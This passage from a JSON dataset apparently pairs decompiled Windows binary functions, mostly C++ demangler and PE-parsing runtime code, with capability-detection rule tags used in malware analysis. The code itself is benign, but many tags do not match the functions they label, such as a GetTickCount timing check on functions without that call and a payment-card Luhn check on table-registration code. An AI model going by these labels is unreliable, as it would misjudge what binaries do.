*(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                ppiVar9 = NULL;\n            }\n            *(arg1 + 0x100) = ppiVar9 + 1;\n            arg1[ppiVar9] = 0x5d;\n            arg1[0x108] = 0x5d;\n        }\n        else {\n            ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n        }\n        break;\n    case 0x405cd2:\n        *(arg1 + 0x130) = 1;\n        break;\n    case 0x405ce1:\n        ppiVar9 = arg3[2];\n        if (*ppiVar9 == 0x39) {\n            piVar24 = ppiVar9[2];\n            bVar32 = *piVar24 == 0x3a;\n            if (bVar32) {\n                piVar18 = arg3[1];\n                piVar30 = ppiVar9[1];\n                iVar14 = 3;\n                uVar4 = *(piVar24 + 2);\n                iVar25 = *(piVar24 + 4);\n                pcVar19 = **(piVar18 + 2);\n                pcVar23 = 0x42d8cb;\n                do {\n                    if (iVar14 == 0) break;\n                    iVar14 = iVar14 + -1;\n                    bVar32 = *pcVar19 == *pcVar23;\n                    pcVar19 = pcVar19 + 1;\n                    pcVar23 = pcVar23 + 1;\n                } while (bVar32);\n                if (bVar32) {\n                    fcn.00409420(arg1, arg2_00, piVar30);\n                    fcn.00409360(arg1, arg2_00, piVar18);\n                    fcn.00409420(arg1, arg2_00, uVar4);\n                    fcn.004046f0(arg1, 0x42da87);\n                    ppiVar9 = fcn.00409420(arg1, arg2_00, iVar25);\n                    return ppiVar9;\n                }\n                fcn.004046f0(arg1, \"new \");\n                if (*(piVar30 + 2) != 0) {\n                    fcn.00409420(arg1, arg2_00, piVar30);\n                    fcn.00401cf0(arg1, 0x20);\n                }\n                ppiVar9 = fcn.00407f90(arg1, arg2_00, uVar4);\n                if (iVar25 == 0) {\n                    return ppiVar9;\n                }\n                ppiVar9 = fcn.00409420(arg1, arg2_00, iVar25);\n                return ppiVar9;\n            }\n        }\ncode_r0x0040562d:\n        *(arg1 + 0x130) = 1;\n        break;\n    case 0x405d80:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"{unnamed type#\";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        puVar22 = &stack0xffffffffffffff38;\n        sub.msvcrt.dll_sprintf(puVar22, 0x42d8e5, *(arg3 + 1) + 1);\n        puVar17 = puVar22;\n        do {\n            puVar16 = puVar17;\n            uVar6 = *puVar16 + 0xfefefeff & ~*puVar16;\n            uVar7 = uVar6 & 0x80808080;\n            puVar17 = puVar16 + 1;\n        } while (uVar7 == 0);\n        bVar32 = (uVar6 & 0x8080) == 0;\n        if (bVar32) {\n            uVar7 = uVar7 >> 0x10;\n        }\n        if (bVar32) {\n            puVar17 = puVar16 + 6;\n        }\n        puVar20 = puVar17 + ((-3 - CARRY1(uVar7, uVar7)) - puVar22);\n        if (puVar20 == NULL) {\n            iVar25 = *(arg1 + 0x100);\n        }\n        else {\n            iVar25 = *(arg1 + 0x100);\n            puVar17 = puVar20 + puVar22;\n            do {\n                uVar31 = *puVar22;\n                if (iVar25 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar25 = 1;\n                }\n                else {\n                    iVar14 = iVar25;\n                    iVar25 = iVar25 + 1;\n                }\n                puVar22 = puVar22 + 1;\n                *(arg1 + 0x100) = iVar25;\n                arg1[iVar14] = uVar31;\n                arg1[0x108] = uVar31;\n            } while (puVar22 != puVar17);\n        }\n        if (iVar25 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            ppiVar9 = 0x1;\n            iVar25 = 0;\n        }\n        else {\n            ppiVar9 = iVar25 + 1;\n        }\n        *(arg1 + 0x100) = ppiVar9;\n        arg1[iVar25] = 0x7d;\n        arg1[0x108] = 0x7d;\n        break;\n    case 0x405e00:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"{lambda(\";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        puVar20 = 0x42db13;\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        iVar25 = *(arg1 + 0x100);\n        do {\n            uVar31 = *puVar20;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            puVar20 = puVar20 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = uVar31;\n            arg1[0x108] = uVar31;\n        } while (puVar20 != 0x42db15);\n        puVar22 = &stack0xffffffffffffff38;\n        sub.msvcrt.dll_sprintf(puVar22, 0x42d8e5, *(arg3 + 2) + 1);\n        puVar17 = puVar22;\n        do {\n            puVar16 = puVar17;\n            uVar6 = *puVar16 + 0xfefefeff & ~*puVar16;\n            uVar7 = uVar6 & 0x80808080;\n            puVar17 = puVar16 + 1;\n        } while (uVar7 == 0);\n        bVar32 = (uVar6 & 0x8080) == 0;\n        if (bVar32) {\n            uVar7 = uVar7 >> 0x10;\n        }\n        if (bVar32) {\n            puVar17 = puVar16 + 6;\n        }\n        puVar20 = puVar17 + ((-3 - CARRY1(uVar7, uVar7)) - puVar22);\n        if (puVar20 == NULL) {\n            iVar25 = *(arg1 + 0x100);\n        }\n        else {\n            iVar25 = *(arg1 + 0x100);\n            puVar17 = puVar20 + puVar22;\n            do {\n                uVar31 = *puVar22;\n                if (iVar25 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar25 = 1;\n                }\n                else {\n                    iVar14 = iVar25;\n                    iVar25 = iVar25 + 1;\n                }\n                puVar22 = puVar22 + 1;\n                *(arg1 + 0x100) = iVar25;\n                arg1[iVar14] = uVar31;\n                arg1[0x108] = uVar31;\n            } while (puVar22 != puVar17);\n        }\n        if (iVar25 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            ppiVar9 = 0x1;\n            iVar25 = 0;\n        }\n        else {\n            ppiVar9 = iVar25 + 1;\n        }\n        *(arg1 + 0x100) = ppiVar9;\n        arg1[iVar25] = 0x7d;\n        arg1[0x108] = 0x7d;\n        break;\n    case 0x405e80:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"global destructors keyed to \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x405f00:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"global constructors keyed to \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x405f80:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"non-transaction clone for \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x406000:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"transaction clone for \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x406080:\n        ppiVar9 = fcn.004020f0(arg1, arg3[1]);\n        if (ppiVar9 == NULL) {\n            fcn.00409420(arg1, arg2_00, arg3[1]);\n            ppiVar9 = fcn.004046f0(arg1, 0x42dabf);\n        }\n        else {\n            iVar29 = 0;\n            do {\n                if ((*ppiVar9 != 0x2f) || (ppiVar9[1] == NULL)) {\n                    piVar24 = arg3[1];\n                    if (iVar29 == 0) {\n                        return ppiVar9;\n                    }\n                    goto code_r0x004060c5;\n                }\n                ppiVar9 = ppiVar9[2];\n                iVar29 = iVar29 + 1;\n            } while (ppiVar9 != NULL);\n            piVar24 = arg3[1];\ncode_r0x004060c5:\n            iVar27 = 0;\n            do {\n                *(arg1 + 0x134) = iVar27;\n                ppiVar9 = fcn.00407f90(arg1, arg2_00, piVar24);\n                if (iVar27 < iVar29 + -1) {\n                    ppiVar10 = *(arg1 + 0x100);\n                    puVar20 = 0x42da68;\n                    do {\n                        uVar31 = *puVar20;\n                        if (ppiVar10 == 0xff) {\n                            arg1[0xff] = 0;\n                            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                            ppiVar9 = NULL;\n                            ppiVar10 = 0x1;\n                        }\n                        else {\n                            ppiVar9 = ppiVar10;\n                            ppiVar10 = ppiVar10 + 1;\n                        }\n                        puVar20 = puVar20 + 1;\n                        *(arg1 + 0x100) = ppiVar10;\n                        arg1[ppiVar9] = uVar31;\n                        arg1[0x108] = uVar31;\n                    } while (puVar20 != 0x42da6a);\n                }\n                iVar27 = iVar27 + 1;\n            } while (iVar27 != iVar29);\n        }\n        break;\n    case 0x406170:\n        if ((arg2 & 0x20) == 0) {\n            if ((arg3[1] != NULL) && ((arg2 & 0x40) == 0)) {\n                appiStack200[0] = *(arg1 + 0x128);\n                apiStack184[0]._0_4_ = 0;\n                *(arg1 + 0x128) = &stack0xffffffffffffff38;\n                apiStack184[1] = *(arg1 + 0x120);\n                appiStack200[1] = arg3;\n                fcn.00407f90(arg1, arg2 & 0xffffff9f, arg3[1]);\n                *(arg1 + 0x128) = appiStack200[0];\n                if (apiStack184[0] != 0) {\n                    return appiStack200[0];\n                }\n                fcn.00401cf0(arg1, 0x20);\n            }\n            ppiVar9 = fcn.00408de0(arg1, arg2 & 0xffffff9f, arg3 + 2, *(arg1 + 0x128));\n        }\n        else {\n            ppiVar9 = fcn.00408de0(arg1, arg2 & 0xffffff9f, arg3 + 2, *(arg1 + 0x128));\n            if (arg3[1] != NULL) {\n                ppiVar9 = fcn.00407f90(arg1, arg2 & 0xffffff9f, arg3[1]);\n            }\n        }\n        break;\n    case 0x4061b0:\n        ppiVar9 = arg3[1];\n        if ((arg2 & 4) == 0) {\n            iVar29 = *(ppiVar9 + 1);\n            piVar24 = *ppiVar9;\n            if (iVar29 != 0) {\n                ppiVar10 = *(arg1 + 0x100);\n                iVar25 = 1;\n                do {\n                    uVar31 = *(piVar24 + iVar25 + -1);\n                    if (ppiVar10 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        ppiVar9 = NULL;\n                        ppiVar10 = 0x1;\n                    }\n                    else {\n                        ppiVar9 = ppiVar10;\n                        ppiVar10 = ppiVar10 + 1;\n                    }\n                    iVar25 = iVar25 + 1;\n                    *(arg1 + 0x100) = ppiVar10;\n                    arg1[ppiVar9] = uVar31;\n                    arg1[0x108] = uVar31;\n                } while (iVar25 != iVar29 + 1);\n            }\n        }\n        else {\n            iVar29 = *(ppiVar9 + 3);\n            piVar24 = ppiVar9[2];\n            if (iVar29 != 0) {\n                ppiVar10 = *(arg1 + 0x100);\n                iVar25 = 1;\n                do {\n                    uVar31 = *(piVar24 + iVar25 + -1);\n                    if (ppiVar10 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        ppiVar9 = NULL;\n                        ppiVar10 = 0x1;\n                    }\n                    else {\n                        ppiVar9 = ppiVar10;\n                        ppiVar10 = ppiVar10 + 1;\n                    }\n                    iVar25 = iVar25 + 1;\n                    *(arg1 + 0x100) = ppiVar10;\n                    arg1[ppiVar9] = uVar31;\n                    arg1[0x108] = uVar31;\n                } while (iVar25 != iVar29 + 1);\n            }\n        }\n        break;\n    case 0x406240:\n        ppiVar9 = arg3[1];\n        uVar7 = *ppiVar9;\n        if (uVar7 == 5) {\n            ppiVar9 = fcn.00402080(arg1, ppiVar9 + 1);\n            if (ppiVar9 == NULL) {\ncode_r0x00407ec5:\n                *(arg1 + 0x130) = 1;\n                return ppiVar9;\n            }\n            uVar7 = *ppiVar9;\n            if (uVar7 == 0x2f) {\n                iVar29 = *(arg1 + 0x134);\n                while (0 < iVar29) {\n                    ppiVar9 = ppiVar9[2];\n                    iVar29 = iVar29 + -1;\n                    if ((ppiVar9 == NULL) || (*ppiVar9 != 0x2f)) goto code_r0x00407ec5;\n                }\n                if ((iVar29 == 0) && (ppiVar9 = ppiVar9[1],  ppiVar9 != NULL)) {\n                    uVar7 = *ppiVar9;\n                    goto code_r0x0040624f;\n                }\n                goto code_r0x00407ec5;\n            }\n        }\ncode_r0x0040624f:\n        if ((uVar7 == 0x23) || (*arg3 == uVar7)) {\n            appiStack200[0] = *(arg1 + 0x128);\n            arg3 = ppiVar9;\n            goto code_r0x004047d7;\n        }\n        if (uVar7 != 0x24) goto code_r0x004047d0;\n        piVar24 = ppiVar9[1];\n        appiStack200[0] = *(arg1 + 0x128);\n        *(arg1 + 0x128) = &stack0xffffffffffffff38;\n        apiStack184[1] = *(arg1 + 0x120);\n        appiStack200[1] = arg3;\n        if (piVar24 == NULL) goto code_r0x00404801;\n        goto code_r0x00404805;\n    case 0x4062b0:\n        appiStack200[0] = *(arg1 + 0x128);\n        apiStack184[0]._0_4_ = 0;\n        *(arg1 + 0x128) = &stack0xffffffffffffff38;\n        apiStack184[1] = *(arg1 + 0x120);\n        appiStack200[1] = arg3;\n        fcn.00407f90(arg1, arg2_00, arg3[2]);\n        if (apiStack184[0] == 0) {\n            fcn.00407fc0(arg1, arg2_00, arg3);\n        }\n        *(arg1 + 0x128) = appiStack200[0];\n        ppiVar9 = appiStack200[0];\n        break;\n    case 0x406320:\n        ppiVar9 = *(arg1 + 0x128);\n        apiStack184[1] = *(arg1 + 0x120);\n        apiStack184[0]._0_4_ = 0;\n        *(arg1 + 0x128) = &stack0xffffffffffffff38;\n        appiStack200[0] = ppiVar9;\n        if ((ppiVar9 == NULL) || (2 < *ppiVar9[1] - 0x19U)) {\n            appiStack200[1] = arg3;\n            ppiVar10 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n            *(arg1 + 0x128) = ppiVar9;\n            if (apiStack184[0] != 0) {\n                return ppiVar10;\n            }\n        }\n        else {\n            uVar7 = 1;\n            ppiVar10 = ppiVar9;\n            puVar20 = &stack0xffffffffffffff38;\n            do {\n                if (*(ppiVar10 + 2) == 0) {\n                    if (3 < uVar7) {\n                        *(arg1 + 0x130) = 1;\n                        return ppiVar10;\n                    }\n                    uVar12 = uVar7;\n                    uVar7 = uVar7 + 1;\n                    iVar25 = uVar12 * 0x20;\n                    *(&stack0xffffffffffffff38 + iVar25) = *ppiVar10;\n                    *(&stack0xffffffffffffff40 + iVar25) = ppiVar10[1];\n                    *(&stack0xffffffffffffff48 + iVar25) = ppiVar10[2];\n                    piVar24 = ppiVar10[3];\n                    *(&stack0xffffffffffffff38 + iVar25) = puVar20;\n                    puVar20 = &stack0xffffffffffffff38 + uVar12 * 0x20;\n                    *(&stack0xffffffffffffff50 + iVar25) = piVar24;\n                    *(arg1 + 0x128) = puVar20;\n                    *(ppiVar10 + 2) = 1;\n                }\n                ppiVar10 = *ppiVar10;\n            } while ((ppiVar10 != NULL) && (*ppiVar10[1] - 0x19U < 3));\n            appiStack200[1] = arg3;\n            ppiVar10 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n            *(arg1 + 0x128) = ppiVar9;\n            if (apiStack184[0] != 0) {\n                return ppiVar10;\n            }\n            if (uVar7 != 1) {\n                do {\n                    uVar7 = uVar7 - 1;\n                    fcn.00407fc0(arg1, arg2_00, *(&stack0xffffffffffffff40 + uVar7 * 0x20));\n                } while (uVar7 != 1);\n                ppiVar9 = *(arg1 + 0x128);\n            }\n        }\n        ppiVar9 = fcn.00408b60(arg1, arg2_00, arg3 + 1, ppiVar9);\n        break;\n    case 0x406460:\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x406473:\n        goto code_r0x00406473;\n    }\n    return ppiVar9;\n}\n",
        "token_count": 27317
    },
    "00409d90": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00409d90(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int32_t *piVar4;\n    uchar *puVar5;\n    ulong *puVar6;\n    uint64_t uVar7;\n    \n    iVar2 = fcn.0040aeb0();\n    iVar1 = *0x4340a8;\n    if ((*0x4340a8 == 0) && (iVar2 != 0)) {\n        *0x4340a8 = 1;\n        iVar3 = fcn.0040acc0(\".pdata\");\n        if (iVar3 == 0) {\n            puVar6 = 0x4341c0;\n            for (iVar3 = 0x30; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            puVar6 = 0x4340c0;\n            for (iVar3 = 0x20; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            uVar7 = 0;\n            piVar4 = 0x4341c0;\n            puVar5 = 0x4340c0;\n            do {\n                iVar3 = fcn.0040ae10(uVar7);\n                if (iVar3 == 0) {\n                    if (uVar7 == 0) goto code_r0x00409dce;\n                    uVar7 = uVar7 & 0xffffffff;\n                    goto code_r0x00409e60;\n                }\n                *puVar5 = 9;\n                *(puVar5 + 4) = 0x409bd0 - iVar2;\n                uVar7 = uVar7 + 1;\n                iVar1 = *(iVar3 + 0xc);\n                *piVar4 = iVar1;\n                piVar4[1] = iVar1 + *(iVar3 + 8);\n                piVar4[2] = puVar5 - iVar2;\n                piVar4 = piVar4 + 3;\n                puVar5 = puVar5 + 8;\n            } while (uVar7 != 0x20);\n            uVar7 = 0x20;\ncode_r0x00409e60:\n            (*_sym.imp.KERNEL32.dll_RtlAddFunctionTable)(0x4341c0, uVar7, iVar2);\n        }\ncode_r0x00409dce:\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 590
    },
    "0040a830": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.0040a830(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint64_t auStack72 [2];\n    uint64_t auStack56 [2];\n    \n    auStack72[0] = 0;\n    if (*0x42c360 != 0x2b992ddfa232) {\n        *0x42c370 = ~*0x42c360;\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(auStack72);\n    uVar1 = auStack72[0];\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    (*_sym.imp.KERNEL32.dll_QueryPerformanceCounter)(auStack56);\n    *0x42c360 = (uVar1 ^ auStack56[0] ^ uVar2 ^ uVar3 ^ uVar4) & 0xffffffffffff;\n    if (*0x42c360 == 0x2b992ddfa232) {\n        *0x42c370 = 0xffffd466d2205dcc;\n        *0x42c360 = 0x2b992ddfa233;\n    }\n    else {\n        *0x42c370 = ~*0x42c360;\n    }\n    return;\n}\n",
        "token_count": 337
    },
    "0040acc0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.0040acc0(ulong arg1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    uVar3 = sub.msvcrt.dll_strlen();\n    if (8 < uVar3) {\n        return 0;\n    }\n    if ((*0x400000 == 0x5a4d) && (iVar2 = fcn.0040ac30(0x400000),  iVar2 != 0)) {\n        iVar4 = *0x40003c;\n        iVar5 = iVar4 + 0x400018 + *(iVar4 + 0x400014);\n        uVar1 = *(iVar4 + 0x400006);\n        if (uVar1 != 0) {\n            iVar4 = iVar5 + 0x28;\n            do {\n                iVar2 = sub.msvcrt.dll_strncmp(iVar5, arg1, 8);\n                if (iVar2 == 0) {\n                    return iVar5;\n                }\n                iVar5 = iVar5 + 0x28;\n            } while (iVar5 != iVar4 + (uVar1 - 1) * 0x28);\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 290
    },
    "0040ad70": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.0040ad70(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    if ((*0x400000 != 0x5a4d) || (iVar2 = fcn.0040ac30(0x400000),  iVar2 == 0)) {\n        return 0;\n    }\n    iVar3 = *0x40003c;\n    iVar4 = iVar3 + 0x400018 + *(iVar3 + 0x400014);\n    if (*(iVar3 + 0x400006) != 0) {\n        iVar1 = iVar4 + 0x28;\n        do {\n            if ((*(iVar4 + 0xc) <= arg1 - 0x400000U) && (arg1 - 0x400000U < *(iVar4 + 0xc) + *(iVar4 + 8))) {\n                return iVar4;\n            }\n            iVar4 = iVar4 + 0x28;\n        } while (iVar4 != iVar1 + (*(iVar3 + 0x400006) - 1) * 0x28);\n    }\n    return 0;\n}\n",
        "token_count": 270
    },
    "0040adc0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nushort fcn.0040adc0(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x400000 == 0x5a4d) {\n        iVar1 = fcn.0040ac30(0x400000);\n        if (iVar1 != 0) {\n            return *(*0x40003c + 0x400006);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 89
    },
    "0040ae10": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.0040ae10(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    if (*0x400000 == 0x5a4d) {\n        iVar2 = fcn.0040ac30(0x400000);\n        if (iVar2 != 0) {\n            iVar3 = *0x40003c;\n            iVar4 = iVar3 + 0x400018 + *(iVar3 + 0x400014);\n            if (*(iVar3 + 0x400006) != 0) {\n                iVar1 = iVar4 + 0x28;\n                do {\n                    if ((*(iVar4 + 0x27) & 0x20) != 0) {\n                        if (arg1 == 0) {\n                            return iVar4;\n                        }\n                        arg1 = arg1 + -1;\n                    }\n                    iVar4 = iVar4 + 0x28;\n                } while (iVar4 != iVar1 + (*(iVar3 + 0x400006) - 1) * 0x28);\n                return 0;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 268
    },
    "0040aeb0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.0040aeb0(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x400000 == 0x5a4d) {\n        iVar1 = fcn.0040ac30(0x400000);\n        if (iVar1 != 0) {\n            return 0x400000;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 83
    },
    "0040b5d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t fcn.0040b5d0(ulong noname_0, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    \n    if (arg3 - arg4 < 0x41) {\n        pcVar1 = swi(3);\n        uVar4 = (*pcVar1)();\n        return uVar4;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetAtomNameA)(noname_0, arg2);\n    if (iVar3 != 0) {\n        iVar5 = 0;\n        uVar4 = 0;\n        do {\n            while (*(arg4 + arg2 + iVar5) == 'A') {\n                cVar2 = iVar5;\n                iVar5 = iVar5 + 1;\n                uVar4 = uVar4 | 1 << (-cVar2 & 0x1fU);\n                if (iVar5 == 0x40) {\n                    return uVar4;\n                }\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 != 0x40);\n        return uVar4;\n    }\n    pcVar1 = swi(3);\n    uVar4 = (*pcVar1)();\n    return uVar4;\n}\n",
        "token_count": 305
    },
    "0040b810": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.0040b810(ulong arg1)\n\n{\n    uint64_t in_RAX;\n    uint64_t uVar1;\n    ulong *puVar2;\n    ulong auStackX8 [4];\n    uint64_t uStack16;\n    \n    puVar2 = auStackX8;\n    uVar1 = in_RAX;\n    if (0xfff < in_RAX) {\n        do {\n            puVar2 = puVar2 + -0x200;\n            *puVar2 = *puVar2;\n            uVar1 = uVar1 - 0x1000;\n        } while (0x1000 < uVar1);\n    }\n    uStack16 = in_RAX;\n    *(puVar2 - uVar1) = *(puVar2 - uVar1);\n    return uStack16;\n}\n",
        "token_count": 182
    },
    "0040e550": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
